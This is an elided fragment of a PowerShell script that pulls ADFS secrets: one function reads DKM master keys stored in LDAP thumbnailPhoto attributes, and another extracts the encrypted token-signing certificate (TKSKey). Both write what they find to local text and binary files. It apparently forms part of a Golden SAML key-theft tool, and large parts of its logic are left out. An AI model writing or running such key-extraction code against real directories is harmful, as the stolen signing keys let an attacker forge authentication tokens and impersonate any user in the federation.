# Function to read ALL DKMKeys from LDAP
function Get-DKMKey {
    param (
    ...
    try {
        ...
        # FIX: Use FindAll() instead of FindOne() to get every key object
        ...
        if ($results) {
            ...
            foreach ($result in $results) {
                if ($result.Properties["thumbnailPhoto"]) {
                    ...
                    # Create Hex string for display/text file
                    $keyString = [System.BitConverter]::ToString($key)

                    Write-Output "[-] Found DKM Key #$count"
                    Write-Output "    Key: $keyString"

                    # 1. Save Hex Text (Distinct filenames)
                    $keyString | Out-File -FilePath ".\DKM-$count.txt" -Encoding ASCII -Force

                    # 2. Save Raw Binary (Distinct filenames)
                    [System.IO.File]::WriteAllBytes("$PWD\DKM-$count.bin", $key)

                    Write-Output "    [+] Saved to DKM-$count.txt and DKM-$count.bin"
...
function Read-EncryptedPfx {
    ...
    while ($reader.Read()) {
        ...
        if ($signingToken) {
            ...
            # 1. Save Base64 Text (TKSKey.txt)
            $encryptedPfx | Out-File -FilePath ".\TKSKey.txt" -Encoding ASCII -Force
            
            # 2. Save Raw Binary (TKSKey.bin) using System.IO
            # Logic: Convert Base64 string -> Byte Array -> Write to file
            $pfxBytes = [System.Convert]::FromBase64String($encryptedPfx)
            [System.IO.File]::WriteAllBytes("$PWD\TKSKey.bin", $pfxBytes)

            Write-Output "[+] Encrypted Key saved to TKSKey.txt and TKSKey.bin"
